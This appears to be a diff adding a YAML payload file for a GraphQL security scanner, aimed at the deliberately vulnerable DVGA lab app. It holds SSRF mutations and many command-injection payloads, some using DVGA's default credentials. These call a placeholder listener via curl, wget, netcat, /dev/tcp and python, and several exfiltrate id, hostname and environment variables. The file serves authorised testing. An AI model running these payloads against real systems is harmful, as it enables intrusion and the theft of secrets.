@@ -1,0 +1,175 @@
+# ================================================================
+# GrapeQL OOB Test Cases — DVGA-Specific
+# Drop into: test_cases/injection/dvga_oob.yaml
+# ================================================================
+#
+# These payloads target vulnerabilities specific to the Damn
+# Vulnerable GraphQL Application (DVGA).
+#
+# Two primary OOB vectors in DVGA:
+#
+#   1. importPaste(host, port, path, scheme) — SSRF
+#      The server constructs a URL from these args and fetches it.
+#      We point host/port at our listener for a guaranteed callback.
+#
+#   2. systemDiagnostics(username, password, cmd) — OS command injection
+#      The cmd arg is passed to os.popen(). We inject curl/wget/nc
+#      commands that call back to our listener.
+#
+# Test cases with a "query" key are sent as-is (raw mutation).
+# This is required for importPaste where all 4 args must be
+# controlled simultaneously.
+#
+# Placeholders:
+#   CALLBACK       -> http://ip:port
+#   CALLBACK_HOST  -> ip only
+#   CALLBACK_PORT  -> port only
+# ================================================================
+
+test_cases:
+
+  # ══════════════════════════════════════════════════════════════════
+  #  importPaste SSRF — raw query payloads
+  # ══════════════════════════════════════════════════════════════════
+  #
+  #  importPaste constructs: {scheme}://{host}:{port}/{path}
+  #  and fetches the resulting URL server-side via urllib/requests.
+  #  We set host+port to our listener so the server connects to us.
+  # ══════════════════════════════════════════════════════════════════
+
+  - name: dvga_importpaste_ssrf_http
+    oob: true
+    description: "SSRF via importPaste — direct HTTP fetch to listener"
+    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/dvga-ssrf", scheme: "http") { result } }'
+
+  - name: dvga_importpaste_ssrf_root
+    oob: true
+    description: "SSRF via importPaste — fetch root path"
+    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/", scheme: "http") { result } }'
+
+  - name: dvga_importpaste_ssrf_exfil_path
+    oob: true
+    description: "SSRF via importPaste — exfil marker in path"
+    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/ssrf-confirmed-importpaste", scheme: "http") { result } }'
+
+  - name: dvga_importpaste_ssrf_https
+    oob: true
+    description: "SSRF via importPaste — HTTPS scheme test"
+    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/dvga-https", scheme: "https") { result } }'
+
+  # ══════════════════════════════════════════════════════════════════
+  #  systemDiagnostics command injection — raw query payloads
+  # ══════════════════════════════════════════════════════════════════
+  #
+  #  systemDiagnostics(username, password, cmd) passes cmd to
+  #  os.popen().  Default creds in DVGA: admin / changeme
+  #  We inject callback commands as the cmd argument.
+  # ══════════════════════════════════════════════════════════════════
+
+  - name: dvga_sysdiag_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — curl callback"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl CALLBACK/dvga-sysdiag-curl") }'
+
+  - name: dvga_sysdiag_curl_exfil_whoami
+    oob: true
+    description: "Command injection via systemDiagnostics — exfil whoami via curl"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl CALLBACK/$(whoami)") }'
+
+  - name: dvga_sysdiag_curl_exfil_id
+    oob: true
+    description: "Command injection via systemDiagnostics — exfil id via curl POST"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl -X POST -d $(id) CALLBACK/exfil") }'
+
+  - name: dvga_sysdiag_curl_exfil_hostname
+    oob: true
+    description: "Command injection via systemDiagnostics — exfil hostname"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl CALLBACK/$(hostname)") }'
+
+  - name: dvga_sysdiag_wget
+    oob: true
+    description: "Command injection via systemDiagnostics — wget callback"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "wget -q -O /dev/null CALLBACK/dvga-sysdiag-wget") }'
+
+  - name: dvga_sysdiag_python_urllib
+    oob: true
+    description: "Command injection via systemDiagnostics — python urllib callback"
+    query: "mutation { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"python3 -c \\\"import urllib.request; urllib.request.urlopen('CALLBACK/dvga-python')\\\"\") }"
+
+  - name: dvga_sysdiag_python_requests
+    oob: true
+    description: "Command injection via systemDiagnostics — python requests callback"
+    query: "mutation { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"python3 -c \\\"import requests; requests.get('CALLBACK/dvga-py-req')\\\"\") }"
+
+  - name: dvga_sysdiag_nc
+    oob: true
+    description: "Command injection via systemDiagnostics — netcat callback"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "echo oob | nc -w 2 CALLBACK_HOST CALLBACK_PORT") }'
+
+  - name: dvga_sysdiag_bash_devtcp
+    oob: true
+    description: "Command injection via systemDiagnostics — bash /dev/tcp"
+    query: "mutation { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"bash -c 'echo oob > /dev/tcp/CALLBACK_HOST/CALLBACK_PORT'\") }"
+
+  - name: dvga_sysdiag_pipe_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — pipe id to curl"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "id | curl -d @- CALLBACK/pipe-id") }'
+
+  - name: dvga_sysdiag_env_exfil
+    oob: true
+    description: "Command injection via systemDiagnostics — exfil environment"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl -d $(env | base64 | head -c 200) CALLBACK/env-exfil") }'
+
+  - name: dvga_sysdiag_ifconfig_exfil
+    oob: true
+    description: "Command injection via systemDiagnostics — exfil network info"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "curl CALLBACK/$(ifconfig eth0 | grep inet | head -1 | tr -s \" \" | cut -d\" \" -f3)") }'
+
+  # ── systemDiagnostics with semicolon prefix ───────────────────────
+  #    Some DVGA configurations prepend a benign command.
+  #    These payloads use ; to break out and chain our callback.
+
+  - name: dvga_sysdiag_semicolon_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — semicolon breakout + curl"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "; curl CALLBACK/dvga-semicolon") }'
+
+  - name: dvga_sysdiag_and_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — && breakout + curl"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "&& curl CALLBACK/dvga-and") }'
+
+  - name: dvga_sysdiag_or_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — || breakout + curl"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "|| curl CALLBACK/dvga-or") }'
+
+  - name: dvga_sysdiag_backtick_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — backtick substitution"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "`curl CALLBACK/dvga-backtick`") }'
+
+  - name: dvga_sysdiag_subshell_curl
+    oob: true
+    description: "Command injection via systemDiagnostics — $() substitution"
+    query: 'mutation { systemDiagnostics(username: "admin", password: "changeme", cmd: "$(curl CALLBACK/dvga-subshell)") }'
+
+  # ── createPaste injection into content field ──────────────────────
+  #    createPaste(title, content, public) stores user input.
+  #    If the backend processes content unsafely (e.g. SSTI, eval),
+  #    injected commands could trigger OOB.
+
+  - name: dvga_createpaste_curl_content
+    oob: true
+    description: "OOB via createPaste content field — curl injection"
+    payload: "; curl CALLBACK/dvga-paste-content"
+    target_args:
+      - content
+
+  - name: dvga_createpaste_curl_title
+    oob: true
+    description: "OOB via createPaste title field — curl injection"
+    payload: "; curl CALLBACK/dvga-paste-title"
+    target_args:
+      - title
